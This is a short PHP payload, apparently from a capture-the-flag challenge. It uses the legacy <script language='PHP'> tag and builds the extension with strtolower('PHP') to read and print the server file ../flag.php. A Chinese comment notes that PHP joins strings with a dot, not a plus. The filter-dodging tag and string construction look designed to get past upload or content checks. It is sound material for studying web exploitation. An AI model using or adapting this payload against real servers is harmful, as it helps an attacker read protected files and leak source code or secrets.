<script language="PHP">
$fh=fopen("../flag.".strtolower("PHP"),'r');
echo fread($fh,filesize("../flag.".strtolower("PHP"))); #点号.是连接符，开始还用+号来连接，搞错了。
fclose($fh);
</script>